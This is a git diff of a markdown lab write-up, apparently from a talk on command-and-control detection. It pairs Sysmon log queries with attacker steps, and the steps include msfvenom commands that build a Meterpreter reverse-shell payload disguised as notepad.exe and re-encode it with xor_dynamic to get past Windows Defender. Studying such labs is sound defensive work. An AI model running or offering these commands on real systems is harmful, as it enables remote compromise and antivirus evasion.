@@ -58,14 +58,13 @@ Sysmon event 1 (and security event 4688) shows `WmiPrvSE.exe` launching `cmd.exe
 
 `Get-WinEvent @{Path="C:\labs\valkyrie-sysmon.evtx";id=1} | Where {$_.Message -like "*ADMIN$*"}|fl`
 
-
-
-
 ## Attacker creates plan.exe with msfvenom:
 
 ### Attacker
 
 `msfvenom -p windows/x64/meterpreter_reverse_tcp LHOST=192.168.37.203 LPORT=8080 -x notepad.exe -f exe > plan.exe`
+
+![image](https://github.com/eric-conrad/c2-talk/assets/14989334/39d67f6f-d25f-49fb-8935-5765d78dfbe8)
 
 Attacker uploads `plan.exe` via wmiexex.py's `lput`, tries to run it, and fails:
 
@@ -83,7 +82,9 @@ Then Windows Defender killed it:
 
 ## Attacker uses xor encoding and re-uploads plan.exe
 
+`msfvenom -p windows/x64/meterpreter_reverse_tcp LHOST=192.168.37.203 LPORT=8080 -i 10 -e x64/xor_dynamic -x notepad.exe -f exe > plan.exe`
 
+They key difference: `-e x64/xor_dynamic`
 
 
 
